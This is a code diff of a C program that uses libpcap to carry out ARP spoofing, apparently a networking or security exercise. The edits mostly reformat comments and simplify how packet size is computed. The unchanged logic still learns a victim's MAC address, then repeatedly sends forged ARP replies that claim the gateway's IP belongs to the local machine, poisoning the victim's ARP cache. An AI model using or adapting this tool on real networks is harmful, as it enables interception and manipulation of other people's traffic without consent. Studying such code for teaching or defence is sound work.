@@ -43,20 +43,20 @@ int main(int argc, char *argv[])
 
 	printf("- send ARP REQUEST to victim \n");
 	ethernet_hdr *ethernet_h = make_ethernet_header(
-		null_mac,  /* ether_dhost */
-		local_mac, /* ether_shost */
-		ARP);	  /* ether_type */
+		null_mac,				/* ether_dhost */
+		local_mac, 				/* ether_shost */
+		ARP);	  				/* ether_type */
 	arp_hdr *arp_h = make_arp_header(
-		ETHERNET,  /* ar_hrd */
-		IPV4,	  /* ar_pro */
-		HWLEN,	 /* ar_hln */
-		PTLEN,	 /* ar_plln */
-		REQUEST,   /* ar_op */
-		local_mac, /* ar_src_mac */
+		ETHERNET, 		 		/* ar_hrd */
+		IPV4,	 		 		/* ar_pro */
+		HWLEN,	 				/* ar_hln */
+		PTLEN,	 				/* ar_plln */
+		REQUEST,   				/* ar_op */
+		local_mac, 				/* ar_src_mac */
 		gate_ip,
-		//		get_local_ip(dev),								/* ar_src_ip : doenst' matter what it is*/
-		null_mac, /* ar_dst_mac */
-		vic_ip);  /* ar_dst_ip */
+//		get_local_ip(dev),			/* ar_src_ip : doenst' matter what it is*/
+		null_mac,				/* ar_dst_mac */
+		vic_ip);  				/* ar_dst_ip */
 	hton_ethernet(ethernet_h);
 	hton_arp(arp_h);
 	print_packet(ethernet_h, arp_h);
@@ -74,23 +74,23 @@ int main(int argc, char *argv[])
 	/* set ethernet_h->ether_shost to received mac address */
 	while ((receive_reply(handle, vic_ip, temp_mac) != 1))
 	{
-		send_packet(handle, ethernet_h, arp_h, REQUEST);
+		send_packet(handle, ethernet_h, arp_h);
 	}
 	printf("\n\n- make ARP REPLY packet");
 	ethernet_hdr *r_ethernet_h = make_ethernet_header(
-		temp_mac,  /* ether_dhost */
-		local_mac, /* ether_shost */
-		ARP);	  /* ether_type */
+		temp_mac,  				/* ether_dhost */
+		local_mac, 				/* ether_shost */
+		ARP);	 				/* ether_type */
 	arp_hdr *r_arp_h = make_arp_header(
-		ETHERNET,  /* ar_hrd */
-		IPV4,	  /* ar_pro */
-		HWLEN,	 /* ar_hln */
-		PTLEN,	 /* ar_plln */
-		REPLY,	 /* ar_op */
-		local_mac, /* ar_src_mac */
-		gate_ip,   /* ar_src_ip */
-		temp_mac,  /* ar_dst_mac */
-		vic_ip);   /* ar_dst_ip */
+		ETHERNET, 				/* ar_hrd */
+		IPV4,	  				/* ar_pro */
+		HWLEN,	 				/* ar_hln */
+		PTLEN,	 				/* ar_plln */
+		REPLY,	 				/* ar_op */
+		local_mac, 				/* ar_src_mac */
+		gate_ip,   				/* ar_src_ip */
+		temp_mac,  				/* ar_dst_mac */
+		vic_ip);   				/* ar_dst_ip */
 
 	hton_ethernet(r_ethernet_h);
 	hton_arp(r_arp_h);
@@ -102,7 +102,7 @@ int main(int argc, char *argv[])
 
 	while ((receive_request(handle, vic_ip) != 1))
 	{
-		send_packet(handle, r_ethernet_h, r_arp_h, REPLY);
+		send_packet(handle, r_ethernet_h, r_arp_h);
 	}
 
 	return 0;
@@ -302,23 +302,11 @@ int receive_request(pcap_t *handle, u_int32_t ar_src_ip)
 	}
 }
 
-void send_packet(pcap_t *handle, ethernet_hdr *ethernet_h, arp_hdr *arp_h, int mode)
+void send_packet(pcap_t *handle, ethernet_hdr *ethernet_h, arp_hdr *arp_h)
 {
 
 	u_char *packet;
-	int packet_size;
-
-	switch (mode)
-	{
-	case REQUEST:
-		packet_size = 42;
-		break;
-	case REPLY:
-		packet_size = 60;
-		break;
-	default:
-		break;
-	}
+	int packet_size = sizeof(ethernet_hdr) + sizeof(arp_hdr);
 
 	packet = (u_char *)malloc(sizeof(u_char) * packet_size);
 	memcpy(packet, ethernet_h, sizeof(ethernet_hdr));
